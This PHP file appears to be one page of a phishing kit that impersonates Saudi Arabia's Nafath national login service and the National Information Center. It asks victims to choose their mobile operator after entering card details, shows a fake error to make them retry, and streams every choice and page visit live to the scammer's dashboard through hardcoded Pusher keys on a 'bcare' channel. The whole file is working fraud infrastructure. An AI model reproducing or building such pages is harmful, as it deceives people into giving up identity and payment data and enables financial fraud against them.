<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'شركات الهاتف');
    $options = ['cluster' => 'ap2', 'useTLS' => true];
    $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
    $pusher->trigger('bcare', 'curreneft-page', ['userId' => $_SESSION['user_id'], 'page' => 'شركات الهاتف']);
}

if (isset($_POST['CompanyName'])) {
    $CompanyName = $_POST['CompanyName'];

    // Using the DB class for consistency
    $db = new DB();
    $db->query("UPDATE card SET company=? WHERE id=?");
    $db->bind(1, $CompanyName);
    $db->bind(2, $_SESSION['card_id']);

    if ($db->execute()) {
        $options = ['cluster' => 'ap2', 'useTLS' => true];
        $pusher = new Pusher\Pusher('4a9de0023f3255d461d9', '3803f60c4dc433d66655', '1918568', $options);
        $pusher->trigger('bcare', 'update-user-accountt', [
            'userId' => $_SESSION['user_id'],
            'updatedData' => ['message' => 'شركات الهاتف', 'company' => $CompanyName]
        ]);
    }

    $_SESSION['CompanyName'] = $CompanyName;
    echo "<script>document.location.href='StepTwo.php';</script>";
    exit;
}
if (isset($_GET['reject'])) {
    $showError = true;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>توثيق رقم الجوال | نفاذ</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --primary-nafad: #11998E;
            --bg-light: #f8fafc;
            --text-dark: #1e293b;
        }

        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: "Cairo", serif;
        }

        body {
            background-color: var(--bg-light);
            color: var(--text-dark);
            min-height: 100vh;
        }

        .nafad-header {
            background: white;
            padding: 1.5rem 0;
            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.05);
            text-align: center;
        }

        .nafad-header img {
            height: 50px;
        }

        .verification-stepper {
            background: white;
            padding: 40px;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.04);
            margin-top: 40px;
        }

        .operator-card {
            background: white;
            border: 2px solid #f1f5f9;
            border-radius: 20px;
            padding: 25px;
            text-align: center;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-decoration: none !important;
        }

        .operator-card:hover {
            border-color: var(--primary-nafad);
            transform: translateY(-8px);
            box-shadow: 0 15px 30px rgba(17, 153, 142, 0.1);
        }

        .operator-card img {
            max-width: 100px;
            max-height: 60px;
            margin-bottom: 20px;
            object-fit: contain;
        }

        .operator-name {
            font-weight: 700;
            color: var(--text-dark);
            font-size: 1.1rem;
        }

        .footer-nafad {
            background: #f1f5f9;
            padding: 40px 0;
            margin-top: 80px;
            border-top: 1px solid #e2e8f0;
        }

        .step-indicator {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-bottom: 30px;
        }

        .step-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #cbd5e1;
        }

        .step-dot.active {
            background: var(--primary-nafad);
            width: 30px;
        }
    </style>
</head>

<body>

    <header class="nafad-header">
        <div class="container">
            <img src="./assets/nafad.png" alt="النفاذ الوطني الموحد">
        </div>
    </header>

    <main class="container">
        <div class="row justify-content-center">
            <div class="col-lg-10">
                <div class="verification-stepper">


                    <h2 class="text-center fw-900 mb-3">توثيق رقم الجوال</h2>
                    <p class="text-center text-muted mb-5">يرجى اختيار مزود الخدمة الخاص برقم الجوال المسجل في تطبيق
                        أبشر لاعتماده لدينا.</p>

                    <form method="POST" id="operatorForm">
                        <input type="hidden" name="CompanyName" id="companyInput">
                        <div class="row g-4 justify-content-center">
                            <!-- Mobily -->
                            <div class="col-6 col-md-4 col-lg-2">
                                <div class="operator-card" onclick="submitOperator('mobily')">
                                    <img src="./assets/mobily.png" alt="موبايلي">
                                    <span class="operator-name">موبايلي</span>
                                </div>
                            </div>
                            <!-- Zain -->
                            <div class="col-6 col-md-4 col-lg-2">
                                <div class="operator-card" onclick="submitOperator('zain')">
                                    <img src="./assets/zain.png" alt="زين">
                                    <span class="operator-name">زين</span>
                                </div>
                            </div>
                            <!-- Virgin -->
                            <div class="col-6 col-md-4 col-lg-2">
                                <div class="operator-card" onclick="submitOperator('Virqin')">
                                    <img src="./assets/Virqin.png" alt="فيرجن">
                                    <span class="operator-name">فيرجن</span>
                                </div>
                            </div>
                            <!-- STC -->
                            <div class="col-6 col-md-4 col-lg-2">
                                <div class="operator-card" onclick="submitOperator('Stc')">
                                    <img src="./assets/Stc.png" alt="STC">
                                    <span class="operator-name">STC</span>
                                </div>
                            </div>
                            <!-- Lebara -->
                            <div class="col-6 col-md-4 col-lg-2">
                                <div class="operator-card" onclick="submitOperator('lebra')">
                                    <img src="./assets/lebra.png" alt="ليبارا">
                                    <span class="operator-name">ليبارا</span>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </main>

    <footer class="footer-nafad">
        <div class="container text-center">
            <div class="row align-items-center">
                <div class="col-md-6 text-md-end mb-3 mb-md-0">
                    <h6 class="fw-bold mb-1">مركز المعلومات الوطني</h6>
                    <p class="small text-muted mb-0">تطوير وتشغيل | جميع الحقوق محفوظة © 2024</p>
                </div>
                <div class="col-md-6 text-md-start">
                    <img src="./assets/NIC.png" alt="NIC" height="40" style="opacity: 0.7;">
                </div>
            </div>
        </div>
    </footer>

    <script>
        function submitOperator(name) {
            document.getElementById('companyInput').value = name;
            document.getElementById('operatorForm').submit();
        }
    </script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id'] ?? null); ?>;
    </script>
    
    <!-- Error Modal -->
    <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content text-center border-0 shadow-lg" style="border-radius: 24px;">
                <div class="modal-header-error p-5" style="background: #fff5f5;">
                    <div class="error-icon-wrapper mx-auto mb-4" style="width: 70px; height: 70px; background: #fee2e2; color: #ef4444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem;">
                        <i class="bi bi-exclamation-triangle-fill"></i>
                    </div>
                    <h5 class="fw-900 text-dark mb-3">المعلومات غير صحيحة</h5>
                    <p class="text-muted small px-3">البيانات المدخلة غير صحيحة، يرجى إعادة اختيار مزود الخدمة والمحاولة مرة أخرى.</p>
                    <button class="btn w-100 mt-4" data-bs-dismiss="modal" style="background: #f1f5f9; color: #475569; height: 55px; border-radius: 12px; font-weight: 800;">حسناً، فهمت</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            <?php if (isset($showError) && $showError): ?>
            var myModal = new bootstrap.Modal(document.getElementById('errorModal'));
            myModal.show();
            <?php endif; ?>
        });
    </script>
    <?php include 'chat_widget.php'; ?>
</body>

</html>